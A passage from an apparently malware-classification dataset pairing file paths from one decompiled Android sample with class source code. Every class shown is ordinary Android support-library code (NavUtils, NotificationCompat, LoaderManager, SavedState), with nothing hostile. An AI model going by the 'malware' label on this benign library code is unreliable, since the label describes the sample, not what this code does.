"");         writer.println(li.toString());         li.dump(innerPrefix,fd,writer,args);       }     }     if (this.mInactiveLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Inactive Loaders:"");       String innerPrefix2=prefix + ""    "";       for (int i2=0; i2 < this.mInactiveLoaders.size(); i2++) {         LoaderInfo li2=this.mInactiveLoaders.valueAt(i2);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mInactiveLoaders.keyAt(i2));         writer.print("": "");         writer.println(li2.toString());         li2.dump(innerPrefix2,fd,writer,args);       }     }   }   @Override public boolean hasRunningLoaders(){     boolean loadersRunning=false;     int count=this.mLoaders.size();     for (int i=0; i < count; i++) {       LoaderInfo li=this.mLoaders.valueAt(i);       loadersRunning|=li.mStarted && !li.mDeliveredData;     }     return loadersRunning;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NavUtils.code","public class NavUtils {   private static final NavUtilsImpl IMPL;   public static final String PARENT_ACTIVITY=""android.support.PARENT_ACTIVITY"";   private static final String TAG=""NavUtils""; public interface NavUtilsImpl {     Intent getParentActivityIntent(    Activity activity);     String getParentActivityName(    Context context,    ActivityInfo activityInfo);     void navigateUpTo(    Activity activity,    Intent intent);     boolean shouldUpRecreateTask(    Activity activity,    Intent intent);   } public static class NavUtilsImplBase implements NavUtilsImpl {     NavUtilsImplBase(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent parentIntent=null;       String parentName=NavUtils.getParentActivityName(activity);       if (parentName != null) {         ComponentName target=new ComponentName(activity,parentName);         try {           String grandparent=NavUtils.getParentActivityName(activity,target);           parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);         }  catch (        PackageManager.NameNotFoundException e) {           Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");         }       }       return parentIntent;     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       String action=activity.getIntent().getAction();       return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       upIntent.addFlags(67108864);       activity.startActivity(upIntent);       activity.finish();     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String parentActivity;       if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {         if (parentActivity.charAt(0) == '.') {           return context.getPackageName() + parentActivity;         }         return parentActivity;       }       return null;     }   } static class NavUtilsImplJB extends NavUtilsImplBase {     NavUtilsImplJB(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent result=NavUtilsJB.getParentActivityIntent(activity);       if (result == null) {         return superGetParentActivityIntent(activity);       }       return result;     }     Intent superGetParentActivityIntent(    Activity activity){       return super.getParentActivityIntent(activity);     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       NavUtilsJB.navigateUpTo(activity,upIntent);     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String result=NavUtilsJB.getParentActivityName(info);       if (result == null) {         return super.getParentActivityName(context,info);       }       return result;     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       IMPL=new NavUtilsImplJB();     }  else {       IMPL=new NavUtilsImplBase();     }   }   public static boolean shouldUpRecreateTask(  Activity sourceActivity,  Intent targetIntent){     return IMPL.shouldUpRecreateTask(sourceActivity,targetIntent);   }   public static void navigateUpFromSameTask(  Activity sourceActivity){     Intent upIntent=getParentActivityIntent(sourceActivity);     if (upIntent == null) {       throw new IllegalArgumentException(""Activity "" + sourceActivity.getClass().getSimpleName() + "" does not have a parent activity name specified. (Did you forget to add the android.support.PARENT_ACTIVITY <meta-data>  element in your manifest?)"");     }     navigateUpTo(sourceActivity,upIntent);   }   public static void navigateUpTo(  Activity sourceActivity,  Intent upIntent){     IMPL.navigateUpTo(sourceActivity,upIntent);   }   public static Intent getParentActivityIntent(  Activity sourceActivity){     return IMPL.getParentActivityIntent(sourceActivity);   }   public static Intent getParentActivityIntent(  Context context,  Class<?> sourceActivityClass) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,new ComponentName(context,sourceActivityClass));     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(context,parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static Intent getParentActivityIntent(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,componentName);     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(componentName.getPackageName(),parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static String getParentActivityName(  Activity sourceActivity){     try {       return getParentActivityName(sourceActivity,sourceActivity.getComponentName());     }  catch (    PackageManager.NameNotFoundException e) {       throw new IllegalArgumentException(e);     }   }   public static String getParentActivityName(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     PackageManager pm=context.getPackageManager();     ActivityInfo info=pm.getActivityInfo(componentName,128);     String parentActivity=IMPL.getParentActivityName(context,info);     return parentActivity;   }   private NavUtils(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NavUtilsImpl.code","public interface NavUtilsImpl {   Intent getParentActivityIntent(  Activity activity);   String getParentActivityName(  Context context,  ActivityInfo activityInfo);   void navigateUpTo(  Activity activity,  Intent intent);   boolean shouldUpRecreateTask(  Activity activity,  Intent intent); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NavUtilsImplBase.code","public static class NavUtilsImplBase implements NavUtilsImpl {   NavUtilsImplBase(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent parentIntent=null;     String parentName=NavUtils.getParentActivityName(activity);     if (parentName != null) {       ComponentName target=new ComponentName(activity,parentName);       try {         String grandparent=NavUtils.getParentActivityName(activity,target);         parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");       }     }     return parentIntent;   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     String action=activity.getIntent().getAction();     return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     upIntent.addFlags(67108864);     activity.startActivity(upIntent);     activity.finish();   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String parentActivity;     if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {       if (parentActivity.charAt(0) == '.') {         return context.getPackageName() + parentActivity;       }       return parentActivity;     }     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NavUtilsImplJB.code","static class NavUtilsImplJB extends NavUtilsImplBase {   NavUtilsImplJB(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent result=NavUtilsJB.getParentActivityIntent(activity);     if (result == null) {       return superGetParentActivityIntent(activity);     }     return result;   }   Intent superGetParentActivityIntent(  Activity activity){     return super.getParentActivityIntent(activity);   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     NavUtilsJB.navigateUpTo(activity,upIntent);   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String result=NavUtilsJB.getParentActivityName(info);     if (result == null) {       return super.getParentActivityName(context,info);     }     return result;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NavUtilsJB.code","class NavUtilsJB {   NavUtilsJB(){   }   public static Intent getParentActivityIntent(  Activity activity){     return activity.getParentActivityIntent();   }   public static boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return activity.shouldUpRecreateTask(targetIntent);   }   public static void navigateUpTo(  Activity activity,  Intent upIntent){     activity.navigateUpTo(upIntent);   }   public static String getParentActivityName(  ActivityInfo info){     return info.parentActivityName;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NonConfigurationInstances.code","static final class NonConfigurationInstances {   Object activity;   SimpleArrayMap<String,Object> children;   Object custom;   ArrayList<Fragment> fragments;   SimpleArrayMap<String,LoaderManagerImpl> loaders;   NonConfigurationInstances(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NoSaveStateFrameLayout.code","class NoSaveStateFrameLayout extends FrameLayout {   public static ViewGroup wrap(  View child){     NoSaveStateFrameLayout wrapper=new NoSaveStateFrameLayout(child.getContext());     ViewGroup.LayoutParams childParams=child.getLayoutParams();     if (childParams != null) {       wrapper.setLayoutParams(childParams);     }     FrameLayout.LayoutParams lp=new FrameLayout.LayoutParams(-1,-1);     child.setLayoutParams(lp);     wrapper.addView(child);     return wrapper;   }   public NoSaveStateFrameLayout(  Context context){     super(context);   }   @Override protected void dispatchSaveInstanceState(  SparseArray<Parcelable> container){     dispatchFreezeSelfOnly(container);   }   @Override protected void dispatchRestoreInstanceState(  SparseArray<Parcelable> container){     dispatchThawSelfOnly(container);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompat.code","public class NotificationCompat {   public static final int FLAG_HIGH_PRIORITY=128;   private static final NotificationCompatImpl IMPL;   public static final int PRIORITY_DEFAULT=0;   public static final int PRIORITY_HIGH=1;   public static final int PRIORITY_LOW=-1;   public static final int PRIORITY_MAX=2;   public static final int PRIORITY_MIN=-2; public interface NotificationCompatImpl {     Notification build(    Builder builder);   } static class NotificationCompatImplBase implements NotificationCompatImpl {     NotificationCompatImplBase(){     }     @Override public Notification build(    Builder b2){       Notification result=b2.mNotification;       result.setLatestEventInfo(b2.mContext,b2.mContentTitle,b2.mContentText,b2.mContentIntent);       if (b2.mPriority > 0) {         result.flags|=128;       }       return result;     }   } static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {     NotificationCompatImplHoneycomb(){     }     @Override public Notification build(    Builder b2){       return NotificationCompatHoneycomb.add(b2.mContext,b2.mNotification,b2.mContentTitle,b2.mContentText,b2.mContentInfo,b2.mTickerView,b2.mNumber,b2.mContentIntent,b2.mFullScreenIntent,b2.mLargeIcon);     }   } static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {     NotificationCompatImplIceCreamSandwich(){     }     @Override public Notification build(    Builder b2){       return NotificationCompatIceCreamSandwich.add(b2.mContext,b2.mNotification,b2.mContentTitle,b2.mContentText,b2.mContentInfo,b2.mTickerView,b2.mNumber,b2.mContentIntent,b2.mFullScreenIntent,b2.mLargeIcon,b2.mProgressMax,b2.mProgress,b2.mProgressIndeterminate);     }   } static class NotificationCompatImplJellybean implements NotificationCompatImpl {     NotificationCompatImplJellybean(){     }     @Override public Notification build(    Builder b2){       NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b2.mContext,b2.mNotification,b2.mContentTitle,b2.mContentText,b2.mContentInfo,b2.mTickerView,b2.mNumber,b2.mContentIntent,b2.mFullScreenIntent,b2.mLargeIcon,b2.mProgressMax,b2.mProgress,b2.mProgressIndeterminate,b2.mUseChronometer,b2.mPriority,b2.mSubText);       Iterator i$=b2.mActions.iterator();       while (i$.hasNext()) {         Action action=i$.next();         jbBuilder.addAction(action.icon,action.title,action.actionIntent);       }       if (b2.mStyle != null) {         if (b2.mStyle instanceof BigTextStyle) {           BigTextStyle style=(BigTextStyle)b2.mStyle;           jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);         }  else         if (b2.mStyle instanceof InboxStyle) {           InboxStyle style2=(InboxStyle)b2.mStyle;           jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);         }  else         if (b2.mStyle instanceof BigPictureStyle) {           BigPictureStyle style3=(BigPictureStyle)b2.mStyle;           jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture,style3.mBigLargeIcon,style3.mBigLargeIconSet);         }       }       return jbBuilder.build();     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new NotificationCompatImplJellybean();       return;     }     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new NotificationCompatImplIceCreamSandwich();     }  else     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new NotificationCompatImplHoneycomb();     }  else {       IMPL=new NotificationCompatImplBase();     }   } public static class Builder {     CharSequence mContentInfo;     PendingIntent mContentIntent;     CharSequence mContentText;     CharSequence mContentTitle;     Context mContext;     PendingIntent mFullScreenIntent;     Bitmap mLargeIcon;     int mNumber;     int mPriority;     int mProgress;     boolean mProgressIndeterminate;     int mProgressMax;     Style mStyle;     CharSequence mSubText;     RemoteViews mTickerView;     boolean mUseChronometer;     ArrayList<Action> mActions=new ArrayList<>();     Notification mNotification=new Notification();     public Builder(    Context context){       this.mContext=context;       this.mNotification.when=System.currentTimeMillis();       this.mNotification.audioStreamType=-1;       this.mPriority=0;     }     public Builder setWhen(    long when){       this.mNotification.when=when;       return this;     }     public Builder setUsesChronometer(    boolean b2){       this.mUseChronometer=b2;       return this;     }     public Builder setSmallIcon(    int icon){       this.mNotification.icon=icon;       return this;     }     public Builder setSmallIcon(    int icon,    int level){       this.mNotification.icon=icon;       this.mNotification.iconLevel=level;       return this;     }     public Builder setContentTitle(    CharSequence title){       this.mContentTitle=title;       return this;     }     public Builder setContentText(    CharSequence text){       this.mContentText=text;       return this;     }     public Builder setSubText(    CharSequence text){       this.mSubText=text;       return this;     }     public Builder setNumber(    int number){       this.mNumber=number;       return this;     }     public Builder setContentInfo(    CharSequence info){       this.mContentInfo=info;       return this;     }     public Builder setProgress(    int max,    int progress,    boolean indeterminate){       this.mProgressMax=max;       this.mProgress=progress;       this.mProgressIndeterminate=indeterminate;       return this;     }     public Builder setContent(    RemoteViews views){       this.mNotification.contentView=views;       return this;     }     public Builder setContentIntent(    PendingIntent intent){       this.mContentIntent=intent;       return this;     }     public Builder setDeleteIntent(    PendingIntent intent){       this.mNotification.deleteIntent=intent;       return this;     }     public Builder setFullScreenIntent(    PendingIntent intent,    boolean highPriority){       this.mFullScreenIntent=intent;       setFlag(128,highPriority);       return this;     }     public Builder setTicker(    CharSequence tickerText){       this.mNotification.tickerText=tickerText;       return this;     }     public Builder setTicker(    CharSequence tickerText,    RemoteViews views){       this.mNotification.tickerText=tickerText;       this.mTickerView=views;       return this;     }     public Builder setLargeIcon(    Bitmap icon){       this.mLargeIcon=icon;       return this;     }     public Builder setSound(    Uri sound){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=-1;       return this;     }     public Builder setSound(    Uri sound,    int streamType){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=streamType;       return this;     }     public Builder setVibrate(    long[] pattern){       this.mNotification.vibrate=pattern;       return this;     }     public Builder setLights(    int argb,    int onMs,    int offMs){       this.mNotification.ledARGB=argb;       this.mNotification.ledOnMS=onMs;       this.mNotification.ledOffMS=offMs;       boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;       this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));       return this;     }     public Builder setOngoing(    boolean ongoing){       setFlag(2,ongoing);       return this;     }     public Builder setOnlyAlertOnce(    boolean onlyAlertOnce){       setFlag(8,onlyAlertOnce);       return this;     }     public Builder setAutoCancel(    boolean autoCancel){       setFlag(16,autoCancel);       return this;     }     public Builder setDefaults(    int defaults){       this.mNotification.defaults=defaults;       if ((defaults & 4) != 0) {         this.mNotification.flags|=1;       }       return this;     }     private void setFlag(    int mask,    boolean value){       if (value) {         this.mNotification.flags|=mask;       }  else {         this.mNotification.flags&=mask ^ (-1);       }     }     public Builder setPriority(    int pri){       this.mPriority=pri;       return this;     }     public Builder addAction(    int icon,    CharSequence title,    PendingIntent intent){       this.mActions.add(new Action(icon,title,intent));       return this;     }     public Builder setStyle(    Style style){       if (this.mStyle != style) {         this.mStyle=style;         if (this.mStyle != null) {           this.mStyle.setBuilder(this);         }       }       return this;     }     @Deprecated public Notification getNotification(){       return NotificationCompat.IMPL.build(this);     }     public Notification build(){       return NotificationCompat.IMPL.build(this);     }   } public static abstract class Style {     CharSequence mBigContentTitle;     Builder mBuilder;     CharSequence mSummaryText;     boolean mSummaryTextSet=false;     public void setBuilder(    Builder builder){       if (this.mBuilder != builder) {         this.mBuilder=builder;         if (this.mBuilder != null) {           this.mBuilder.setStyle(this);         }       }     }     public Notification build(){       if (this.mBuilder == null) {         return null;       }       Notification notification=this.mBuilder.build();       return notification;     }   } public static class BigPictureStyle extends Style {     Bitmap mBigLargeIcon;     boolean mBigLargeIconSet;     Bitmap mPicture;     public BigPictureStyle(){     }     public BigPictureStyle(    Builder builder){       setBuilder(builder);     }     public BigPictureStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigPictureStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigPictureStyle bigPicture(    Bitmap b2){       this.mPicture=b2;       return this;     }     public BigPictureStyle bigLargeIcon(    Bitmap b2){       this.mBigLargeIcon=b2;       this.mBigLargeIconSet=true;       return this;     }   } public static class BigTextStyle extends Style {     CharSequence mBigText;     public BigTextStyle(){     }     public BigTextStyle(    Builder builder){       setBuilder(builder);     }     public BigTextStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public BigTextStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public BigTextStyle bigText(    CharSequence cs){       this.mBigText=cs;       return this;     }   } public static class InboxStyle extends Style {     ArrayList<CharSequence> mTexts=new ArrayList<>();     public InboxStyle(){     }     public InboxStyle(    Builder builder){       setBuilder(builder);     }     public InboxStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public InboxStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public InboxStyle addLine(    CharSequence cs){       this.mTexts.add(cs);       return this;     }   } public static class Action {     public PendingIntent actionIntent;     public int icon;     public CharSequence title;     public Action(    int icon_,    CharSequence title_,    PendingIntent intent_){       this.icon=icon_;       this.title=title_;       this.actionIntent=intent_;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatHoneycomb.code","class NotificationCompatHoneycomb {   NotificationCompatHoneycomb(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon){     Notification.Builder b2=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number);     return b2.getNotification();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatIceCreamSandwich.code","class NotificationCompatIceCreamSandwich {   NotificationCompatIceCreamSandwich(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate){     Notification.Builder b2=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setProgress(mProgressMax,mProgress,mProgressIndeterminate);     return b2.getNotification();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatImpl.code","public interface NotificationCompatImpl {   Notification build(  Builder builder); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatImplBase.code","static class NotificationCompatImplBase implements NotificationCompatImpl {   NotificationCompatImplBase(){   }   @Override public Notification build(  Builder b2){     Notification result=b2.mNotification;     result.setLatestEventInfo(b2.mContext,b2.mContentTitle,b2.mContentText,b2.mContentIntent);     if (b2.mPriority > 0) {       result.flags|=128;     }     return result;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatImplHoneycomb.code","static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {   NotificationCompatImplHoneycomb(){   }   @Override public Notification build(  Builder b2){     return NotificationCompatHoneycomb.add(b2.mContext,b2.mNotification,b2.mContentTitle,b2.mContentText,b2.mContentInfo,b2.mTickerView,b2.mNumber,b2.mContentIntent,b2.mFullScreenIntent,b2.mLargeIcon);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatImplIceCreamSandwich.code","static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {   NotificationCompatImplIceCreamSandwich(){   }   @Override public Notification build(  Builder b2){     return NotificationCompatIceCreamSandwich.add(b2.mContext,b2.mNotification,b2.mContentTitle,b2.mContentText,b2.mContentInfo,b2.mTickerView,b2.mNumber,b2.mContentIntent,b2.mFullScreenIntent,b2.mLargeIcon,b2.mProgressMax,b2.mProgress,b2.mProgressIndeterminate);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatImplJellybean.code","static class NotificationCompatImplJellybean implements NotificationCompatImpl {   NotificationCompatImplJellybean(){   }   @Override public Notification build(  Builder b2){     NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b2.mContext,b2.mNotification,b2.mContentTitle,b2.mContentText,b2.mContentInfo,b2.mTickerView,b2.mNumber,b2.mContentIntent,b2.mFullScreenIntent,b2.mLargeIcon,b2.mProgressMax,b2.mProgress,b2.mProgressIndeterminate,b2.mUseChronometer,b2.mPriority,b2.mSubText);     Iterator i$=b2.mActions.iterator();     while (i$.hasNext()) {       Action action=i$.next();       jbBuilder.addAction(action.icon,action.title,action.actionIntent);     }     if (b2.mStyle != null) {       if (b2.mStyle instanceof BigTextStyle) {         BigTextStyle style=(BigTextStyle)b2.mStyle;         jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);       }  else       if (b2.mStyle instanceof InboxStyle) {         InboxStyle style2=(InboxStyle)b2.mStyle;         jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);       }  else       if (b2.mStyle instanceof BigPictureStyle) {         BigPictureStyle style3=(BigPictureStyle)b2.mStyle;         jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture,style3.mBigLargeIcon,style3.mBigLargeIconSet);       }     }     return jbBuilder.build();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\NotificationCompatJellybean.code","class NotificationCompatJellybean {   private Notification.Builder f3b;   public NotificationCompatJellybean(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate,  boolean useChronometer,  int priority,  CharSequence subText){     this.f3b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setSubText(subText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setUsesChronometer(useChronometer).setPriority(priority).setProgress(mProgressMax,mProgress,mProgressIndeterminate);   }   public void addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.f3b.addAction(icon,title,intent);   }   public void addBigTextStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  CharSequence bigText){     Notification.BigTextStyle style=new Notification.BigTextStyle(this.f3b).setBigContentTitle(bigContentTitle).bigText(bigText);     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addBigPictureStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  Bitmap bigPicture,  Bitmap bigLargeIcon,  boolean bigLargeIconSet){     Notification.BigPictureStyle style=new Notification.BigPictureStyle(this.f3b).setBigContentTitle(bigContentTitle).bigPicture(bigPicture);     if (bigLargeIconSet) {       style.bigLargeIcon(bigLargeIcon);     }     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addInboxStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  ArrayList<CharSequence> texts){     Notification.InboxStyle style=new Notification.InboxStyle(this.f3b).setBigContentTitle(bigContentTitle);     if (useSummary) {       style.setSummaryText(summaryText);     }     Iterator i$=texts.iterator();     while (i$.hasNext()) {       CharSequence text=i$.next();       style.addLine(text);     }   }   public Notification build(){     return this.f3b.build();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\OnBackStackChangedListener.code","public interface OnBackStackChangedListener {   void onBackStackChanged(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\Op.code","public static final class Op {   int cmd;   int enterAnim;   int exitAnim;   Fragment fragment;   Op next;   int popEnterAnim;   int popExitAnim;   Op prev;   ArrayList<Fragment> removed; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\SavedState.code","public static class SavedState implements Parcelable {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in,null);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   final Bundle mState;   public SavedState(  Bundle state){     this.mState=state;   }   SavedState(  Parcel in,  ClassLoader loader){     this.mState=in.readBundle();     if (loader != null && this.mState != null) {       this.mState.setClassLoader(loader);     }   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeBundle(this.mState);   } } public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   String curTab;   SavedState(  Parcelable superState){     super(superState);   }   private SavedState(  Parcel in){     super(in);     this.curTab=in.readString();   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeString(this.curTab);   }   public String toString(){     return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";   } } "
